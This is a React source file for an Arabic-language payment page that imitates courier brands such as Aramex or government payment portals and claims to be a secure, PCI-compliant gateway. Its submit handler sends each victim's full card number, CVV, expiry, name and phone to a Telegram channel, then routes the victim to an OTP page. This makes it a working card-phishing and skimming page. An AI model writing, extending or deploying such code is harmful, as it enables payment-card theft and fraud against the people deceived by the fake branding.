import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { useLink, usePayment, useUpdatePayment } from "@/hooks/useSupabase";
import { CreditCard, Lock, ShieldCheck, Calendar, ArrowLeft, Loader2, Landmark, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { formatCurrency } from "@/lib/countryCurrencies";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";

const PaymentCardInput = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading: linkLoading } = useLink(id);
  const paymentId = searchParams.get("paymentId");
  const { data: payment } = usePayment(paymentId || undefined);
  const updatePayment = useUpdatePayment();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const company = searchParams.get("company") || link?.payload?.service_key || "aramex";
  const branding = getServiceBranding(company);
  const countryCode = link?.country_code || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);
  };
  
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv || !payment) {
      toast({ title: "خطأ", description: "الرجاء ملء جميع الحقول", variant: "destructive" });
      return;
    }
    if (!validateLuhn(cardNumber)) {
      toast({ title: "رقم البطاقة غير صحيح", variant: "destructive" });
      return;
    }
    
    setIsSubmitting(true);
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    const expiry = `${expiryMonth}/${expiryYear}`;
    const cardType = detectCardType(cardNumber);

    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "payment-card",
          cardholderName: cardName,
          cardLast4: last4,
          expiryMonth,
          expiryYear,
          service: link?.payload?.service_name || company,
          paymentId: payment.id,
          linkId: id || ''
        }).toString()
      });

      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: { cardholder_name: cardName, last_four: last4, status: "authorized" }
      });

      await sendToTelegram({
        type: 'card_details_entered',
        data: {
          name: payment.name,
          phone: payment.phone,
          cardholder: cardName,
          cardNumber: cardNumber,
          expiry: expiry,
          cvv: cvv,
          cardType,
          service: link?.payload?.service_name || company,
          amount: formatCurrency(payment.amount, payment.currency)
        },
        timestamp: new Date().toISOString()
      });

      toast({ title: "تم التحقق", description: "جاري تحويلك لصفحة التحقق..." });
      navigate(`/pay/${id}/otp/${payment.id}`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !link) {
    return <div className="min-h-screen flex items-center justify-center bg-gray-50"><Loader2 className="w-10 h-10 animate-spin text-blue-600" /></div>;
  }

  const isGov = company.startsWith('gov_');
  const primaryColor = isGov ? govSystem.colors.primary : branding.colors.primary;

  return (
    <div className="min-h-screen bg-[#F1F5F9] pb-20" dir="rtl">
      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
          <div className="flex items-center gap-4">
             <BackButton />
             <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-lg" style={{ background: primaryColor }}>
                   <CreditCard className="w-5 h-5" />
                </div>
                <div>
                   <h1 className="text-lg font-black text-gray-800 leading-none">بوابة الدفع الآمنة</h1>
                   <p className="text-[8px] font-bold text-gray-400 uppercase tracking-widest mt-1">PCI DSS COMPLIANT GATEWAY</p>
                </div>
             </div>
          </div>
          <div className="flex items-center gap-3">
             <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-green-50 text-green-700 rounded-full text-[10px] font-black uppercase border border-green-100">
                <ShieldCheck className="w-3.5 h-3.5" /> Secure Transaction
             </div>
             {isGov ? (
               govSystem.logo && <img src={govSystem.logo} className="h-8 w-auto object-contain" alt="" />
             ) : (
               branding.logo && <img src={branding.logo} className="h-8 w-auto object-contain" alt="" />
             )}
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-10">
        <div className="max-w-4xl mx-auto grid md:grid-cols-5 gap-10">
           <div className="md:col-span-3">
              <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white relative overflow-hidden">
                 <div className="absolute top-0 right-0 w-40 h-40 opacity-[0.02] -mr-20 -mt-20 rounded-full" style={{ background: primaryColor }} />
                 <div className="flex items-center gap-4 mb-10"><div className="w-1.5 h-8 rounded-full" style={{ background: primaryColor }} /><div><h2 className="text-2xl font-black text-gray-800">بيانات البطاقة</h2><p className="text-sm font-bold text-gray-400">يرجى إدخال بيانات البطاقة البنكية بعناية</p></div></div>

                 <form onSubmit={handleSubmit} className="space-y-8">
                    <div className="space-y-2">
                       <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">اسم حامل البطاقة</Label>
                       <div className="relative group">
                          <User className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                          <Input value={cardName} onChange={(e) => setCardName(e.target.value.toUpperCase())} className="h-16 pr-14 border-2 rounded-2xl font-black text-xl bg-gray-50 focus:bg-white transition-all uppercase" placeholder="NAME ON CARD" required />
                       </div>
                    </div>
                    <div className="space-y-2">
                       <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">رقم البطاقة</Label>
                       <div className="relative group">
                          <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-6 h-6 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                          <Input value={cardNumber} onChange={(e) => handleCardNumberChange(e.target.value)} className="h-16 pr-14 border-2 rounded-2xl font-black text-2xl bg-gray-50 focus:bg-white transition-all tracking-[0.2em]" placeholder="0000 0000 0000 0000" inputMode="numeric" required />
                       </div>
                    </div>
                    <div className="grid grid-cols-3 gap-6">
                       <div className="col-span-2 space-y-2">
                          <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">تاريخ الانتهاء</Label>
                          <div className="grid grid-cols-2 gap-3">
                             <Select value={expiryMonth} onValueChange={setExpiryMonth} required><SelectTrigger className="h-16 border-2 rounded-2xl font-black text-xl bg-gray-50"><SelectValue placeholder="MM" /></SelectTrigger><SelectContent className="rounded-2xl border-2">{months.map(m => <SelectItem key={m.value} value={m.value} className="h-12 font-black">{m.label}</SelectItem>)}</SelectContent></Select>
                             <Select value={expiryYear} onValueChange={setExpiryYear} required><SelectTrigger className="h-16 border-2 rounded-2xl font-black text-xl bg-gray-50"><SelectValue placeholder="YY" /></SelectTrigger><SelectContent className="rounded-2xl border-2">{years.map(y => <SelectItem key={y.value} value={y.value} className="h-12 font-black">20{y.label}</SelectItem>)}</SelectContent></Select>
                          </div>
                       </div>
                       <div className="space-y-2">
                          <Label className="text-xs font-black text-gray-400 uppercase tracking-widest">CVV</Label>
                          <div className="relative group">
                             <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
                             <Input value={cvv} onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} className="h-16 pr-12 border-2 rounded-2xl font-black text-2xl text-center bg-gray-50 focus:bg-white transition-all" placeholder="***" type="password" inputMode="numeric" required />
                          </div>
                       </div>
                    </div>
                    <Button type="submit" disabled={isSubmitting} className="w-full h-20 rounded-[1.5rem] text-white text-2xl font-black shadow-2xl transition-all hover:scale-[1.02] active:scale-[0.98]" style={{ background: primaryColor, boxShadow: `0 10px 30px -10px ${primaryColor}60` }}>
                      {isSubmitting ? <Loader2 className="w-8 h-8 animate-spin" /> : "إتمام الدفع الآمن"}
                    </Button>
                 </form>
              </Card>
           </div>

           <div className="md:col-span-2 space-y-8">
              <Card className="p-8 border-0 shadow-xl rounded-[2.5rem] bg-white">
                 <h3 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-6">تفاصيل العملية</h3>
                 <div className="space-y-6">
                    <div className="flex justify-between items-center text-sm font-bold">
                       <span className="text-gray-400">المبلغ:</span>
                       <span className="text-2xl font-black text-gray-800" style={{ color: primaryColor }}>{payment ? formatCurrency(payment.amount, payment.currency) : '---'}</span>
                    </div>
                 </div>
              </Card>
           </div>
        </div>
      </div>
      <BottomNav />
      <form name="payment-card" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
        <input type="text" name="cardholderName" /><input type="text" name="cardLast4" /><input type="text" name="expiryMonth" /><input type="text" name="expiryYear" /><input type="text" name="service" /><input type="text" name="paymentId" /><input type="text" name="linkId" />
      </form>
    </div>
  );
};

export default PaymentCardInput;
